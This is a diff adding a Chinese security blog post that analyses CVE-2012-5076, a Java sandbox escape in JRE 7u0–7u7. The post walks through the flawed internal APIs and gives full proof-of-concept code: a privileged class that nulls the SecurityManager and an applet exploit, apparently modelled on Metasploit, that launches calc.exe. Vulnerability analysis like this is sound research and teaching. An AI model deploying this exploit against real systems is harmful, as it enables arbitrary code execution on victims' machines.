@@ -1,0 +1,211 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Java Exploit分析之CVE-2012-5076 | 骆驼的乌托邦</title>
+  <meta name="author" content="liteway">
+  
+  <meta name="description" content="CVE-2012-5076一个是Java API层的漏洞，通过利用缺陷API间接调用Bootstrap Classloader来加载自定义的提权类，从而绕过JRE Sandbox的限制。该漏洞影响范围是JRE7U0-JRE7U7。">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Java Exploit分析之CVE-2012-5076"/>
+  <meta property="og:site_name" content="骆驼的乌托邦"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.ico" rel="icon" type="image/x-ico">
+  <link rel="alternate" href="/atom.xml" title="骆驼的乌托邦" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">骆驼的乌托邦</a></h1>
+  <h2 class="subtitle"></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+      <li><a href="/about">About</a></li>
+    
+      <li><a href="/atom.xml">RSS</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2014-09-17T16:01:01.000Z"><a href="/2014/09/18/java_cve_2012_5076/">2014-09-18</a></time>
+      
+      
+  
+    <h1 class="title">Java Exploit分析之CVE-2012-5076</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>CVE-2012-5076一个是Java API层的漏洞，通过利用缺陷API间接调用Bootstrap Classloader来加载自定义的提权类，从而绕过JRE Sandbox的限制。该漏洞影响范围是JRE7U0-JRE7U7。<a id="more"></a></p>
+<p>CVE-2012-5076和<a href="http://www.ninehackers.com/2014/09/14/java_cve_2012_4681" target="_blank" rel="external">CVE-2012-4681</a>都是API层的漏洞，都是通过将SecurityManager置空来达到绕过Sandbox的目的。但不同的是，<a href="http://www.ninehackers.com/2014/09/14/java_cve_2012_4681" target="_blank" rel="external">CVE-2012-4681</a>通过构造一个可以执行setSecurityManager操作的上下文(具有AllPermission的AccessControlContext对象)，而CVE-2012-5076则是利用Bootstrap Classloader的特权来加载自定义的提权类，在提权类中执行setSecurityManager的操作。</p>
+<h2 id="缺陷API">缺陷API</h2><p>该漏洞涉及的缺陷API有3个：</p>
+<ul>
+<li>com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory</li>
+<li>com.sun.org.glassfish.gmbal.util.GenericConstructor</li>
+<li>sun.invoke.anon.AnonymousClassLoader</li>
+</ul>
+<ol>
+<li><p>我们攻击的目标就是AnonymousClassLoader类中的loadClass方法，它会调用sun.misc.Unsafe类中的defineClass方法，该方法会以Bootstrap Classloader来加载任意的类，而Bootstrap Classloader加载的类在JVM中会认为是可信的。因此，我们可以自定义一个提权类，在该类中执行置空SecurityManager的操作，从而越过安全检查。</p>
+</li>
+<li><p>sun包中的类是禁止直接访问的，我们需要通过辅助的API来间接访问AnonymousClassLoader类。ManagedObjectManagerFactory类中的getMethod方法可以用来获取loadClass方法对象，而GenericConstructor类中的create方法可以用来创建AnonymousClassLoader类的实例，在该实例上调用loadClass方法来加载并运行提权类中的操作，JRE Sandbox即被攻破。</p>
+</li>
+</ol>
+<h2 id="详细利用分析">详细利用分析</h2><h3 id="1-_构造提权类">1. 构造提权类</h3><p>提权类MyPayload继承自PrivilegedExceptionAction类，在doPrivileged方法中实现特权操作-执行run方法来置空SecurityManager。MyPayload.java代码如下：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.AccessController;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.PrivilegedActionException;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.PrivilegedExceptionAction;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyPayload</span> <span class="keyword">implements</span> <span class="title">PrivilegedExceptionAction</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> MyPayload() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      AccessController.doPrivileged(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(PrivilegedActionException pae)&#123;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Object run() throws Exception &#123;</span><br><span class="line">    System.setSecurityManager(<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>但MyPayload要想在JRE Sandbox中运行，必须用Bootstrap Classloader来加载，下面我们就要找到能间接调用Bootstrap Classloader的缺陷API。</p>
+<h3 id="2-_如何加载提权类">2. 如何加载提权类</h3><p>从openjdk源码中可以发现，sun.invoke.anon.AnonymousClassLoader类的loadClass方法调用了fakeLoadClass方法，fakeLoadClass中又调用了unsafe.defineClass方法，unsafe为sun.misc.Unsafe类的实例，defineClass()为一个native方法，可以不经过安全检查而直接调用最顶层的Bootstrap Classloader加载任意类。<br>loadClass方法接收一个byte数组作为参数，我们首先要将提权类编译成字节码，并转化为byte数组：<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ByteArrayOutputStream outStream =<span class="instruction"> new </span>ByteArrayOutputStream(<span class="function">)</span>;</span><br><span class="line">byte<span class="keyword">[</span>] bArr =<span class="instruction"> new </span>byte<span class="keyword">[</span>8192];</span><br><span class="line">InputStream inStream =<span class="function"> getClass(</span><span class="function">)</span>.getResourceAsStream(<span class="string">"MyPayload.class"</span><span class="function">)</span>;<span class="instruction"></span><br><span class="line">int </span>len = -1;</span><br><span class="line">while((len=inStream.read(bArr<span class="function">)</span><span class="function">)</span> &gt; 0<span class="function">)</span>&#123;</span><br><span class="line"> <span class="function"> outStream.write(</span>bArr, 0, len<span class="function">)</span>;</span><br><span class="line">&#125;</span><br><span class="line">//bArr is MyPayload class byte<span class="instruction"> array</span><br><span class="line"></span>bArr =<span class="function"> outStream.toByteArray(</span><span class="function">)</span>;</span><br></pre></td></tr></table></figure></p>
+<p>根据JRE的包访问策略，sun包是限制访问的，所以目前的问题是如何构造AnonymousClassLoader对象，然后调用实例方法loadClass()。</p>
+<h3 id="3-_生成AnonymousClassLoader对象">3. 生成AnonymousClassLoader对象</h3><p>在com.sun.org.glassfish.gmbal.util.GenericConstructor类中，create方法调用反射方法constructor.newInstance()来生成任意类的实例。我们可以利用create方法来构造AnonymousClassLoader的实例：<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GenericConstructor gc = <span class="keyword">new</span> GenericConstructor(<span class="built_in">Object</span>.<span class="keyword">class</span>, <span class="string">"sun.invoke.anon.AnonymousClassLoader"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">Object</span> obj = gc.create(<span class="keyword">new</span> <span class="built_in">Object</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></p>
+<h3 id="4-_调用loadClass方法">4. 调用loadClass方法</h3><p>在#3中生成了AnonymousClassLoader对象后，我们需要调用该对象的loadClass方法，而该方法不能直接调用。com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory类中的反射方法getMethod()可以帮助我们达到这个目的，getMethod在doPrivileged块中调用getDeclaredMethod()，它可以用来获取任意方法对象。<br>我们借助getMethod方法来得到loadClass方法对象，加载MyPayload提权类，反射调用newInstance方法来实例化该提权类，提权类中的run()方法自动运行，SecurityManager被置为null，JRE Sandbox即被攻破。<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Method</span> <span class="title">md</span> = <span class="title">ManagedObjectManagerFactory</span>.<span class="title">getMethod</span><span class="params">(obj.getClass()</span>, "<span class="title">loadClass</span>", <span class="title">new</span> <span class="title">Class</span>[]<span class="comment">&#123;new byte[0].getClass()&#125;</span>);</span></span><br><span class="line"><span class="comment">//cls is MyPayload class object</span></span><br><span class="line"><span class="keyword">Class</span> cls = (<span class="keyword">Class</span>)md.invoke(obj, <span class="keyword">new</span> Object[]<span class="comment">&#123;bArr&#125;</span>);</span><br><span class="line"><span class="comment">//instance MyPayload class to set SecurityManager=null</span></span><br><span class="line">cls.newInstance();</span><br></pre></td></tr></table></figure></p>
+<h3 id="5-_POC参考代码">5. POC参考代码</h3><p>CVE-2012-5076的Exploit代码（参考Metasploit）：<br>MyPayload.java参考#1中描述，Exploit.java代码如下：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.applet.Applet;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.glassfish.gmbal.util.GenericConstructor;</span><br><span class="line"></span><br><span class="line"><span class="comment">//CVE-2012-5076</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> Exploit <span class="keyword">extends</span> Applet &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> init()&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.disableSecurity();</span><br><span class="line">      <span class="keyword">this</span>.setPayload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Throwable t)&#123;</span><br><span class="line">      t.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> disableSecurity() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">//transform class file to byte array</span></span><br><span class="line">      ByteArrayOutputStream outStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">      <span class="keyword">byte</span>[] bArr = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8192</span>];</span><br><span class="line">      InputStream inStream = getClass().getResourceAsStream(<span class="string">"MyPayload.class"</span>);</span><br><span class="line">      <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span>((len=inStream.<span class="keyword">read</span>(bArr)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        outStream.<span class="keyword">write</span>(bArr, <span class="number">0</span>, len);</span><br><span class="line">      &#125;</span><br><span class="line">      bArr = outStream.toByteArray();</span><br><span class="line">      <span class="comment">//create classloader object</span></span><br><span class="line">      GenericConstructor gc = <span class="keyword">new</span> GenericConstructor(Object.<span class="keyword">class</span>, <span class="string">"sun.invoke.anon.AnonymousClassLoader"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[<span class="number">0</span>]);</span><br><span class="line">      Object obj = gc.create(<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">      <span class="comment">//call loadclass method to load byte array</span></span><br><span class="line">      Method md = ManagedObjectManagerFactory.getMethod(obj.getClass(), <span class="string">"loadClass"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[]&#123;<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>].getClass()&#125;);</span><br><span class="line">      <span class="keyword">Class</span> cls = (<span class="keyword">Class</span>)md.invoke(obj, <span class="keyword">new</span> Object[]&#123;bArr&#125;);</span><br><span class="line">      <span class="comment">//instance MyPayload class to set SecurityManager=null</span></span><br><span class="line">      cls.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> setPayload() <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="keyword">Runtime</span>.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer>
+      
+        
+  
+  <div class="categories">
+    <a href="/categories/漏洞分析/">漏洞分析</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/Java-CVE/">Java CVE</a>
+  </div>
+
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="搜索">
+    <input type="hidden" name="q" value="site:github.com/liteway/liteway.github.io">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/Python/">Python</a><small>1</small></li>
+  
+    <li><a href="/categories/渗透测试/">渗透测试</a><small>1</small></li>
+  
+    <li><a href="/categories/漏洞分析/">漏洞分析</a><small>4</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">最新文章</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2015/06/20/py_httpclient/">Python HTTP Client Lib</a>
+      </li>
+    
+      <li>
+        <a href="/2015/04/20/ie_cve_2012_4969/">IE UAF漏洞分析之CVE-2012-4969</a>
+      </li>
+    
+      <li>
+        <a href="/2014/11/30/java_exploit_type_confusion/">Watching Type Confusion Attacks from Java Exploits</a>
+      </li>
+    
+      <li>
+        <a href="/2014/09/18/java_cve_2012_5076/">Java Exploit分析之CVE-2012-5076</a>
+      </li>
+    
+      <li>
+        <a href="/2014/09/14/java_cve_2012_4681/">Java Exploit分析之CVE-2012-4681</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/IE-CVE/" style="font-size: 10px;">IE CVE</a> <a href="/tags/Java-CVE/" style="font-size: 20px;">Java CVE</a> <a href="/tags/Metasploit/" style="font-size: 10px;">Metasploit</a> <a href="/tags/UAF/" style="font-size: 10px;">UAF</a> <a href="/tags/python/" style="font-size: 10px;">python</a>
+  </div>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2015 liteway
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
